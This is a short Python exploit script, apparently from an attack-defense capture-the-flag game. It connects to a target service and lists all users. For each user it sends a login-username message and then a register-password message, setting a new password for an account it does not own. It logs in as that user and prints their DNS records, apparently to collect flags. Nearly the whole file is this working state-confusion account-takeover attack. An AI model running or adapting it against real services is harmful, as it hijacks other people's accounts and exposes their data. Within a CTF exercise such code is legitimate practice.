#!../venv/bin/python
import sys
sys.path.insert(1, "../")

from checker import PORT
from service_api import *

with remote(sys.argv[1], PORT) as io:
    skip_welcome_msg(io)

    username = generate_str(7, 30)
    password = generate_str(25, 30)
    register(io, username, password)
    login(io, username, password)

    users = show_users(io)

    for user in users:
        io.sendline(f"1|0|{user}".encode())  # ACTION_LOGIN|STATE_LOGIN_USERNAME|
        msg = io.recv(timeout=TIMEOUT)
        if b"Enter password!" not in msg:
            raise ADException(Status.CORRUPT, "Problem with STATE_LOGIN_USERNAME", msg)

        new_pass = generate_str(25, 30)
        io.sendline(f"0|1|{new_pass}".encode())  # ACTION_REGISTER|STATE_REG_PASS|
        msg = io.recv(timeout=TIMEOUT)
        if b"Password is defined" not in msg:
            raise ADException(Status.MUMBLE, "Problem with STATE_REG_PASS", msg)

        io.sendline(f"1|1|{new_pass}".encode())  # ACTION_LOGIN|STATE_LOGIN_PASS|
        msg = io.recvline(timeout=TIMEOUT)
        if b"You're logged in!" not in msg:
            raise ADException(Status.CORRUPT, "Problem with STATE_LOGIN_PASS", msg)

        print(show_my_dns(io))
    exit_(io)
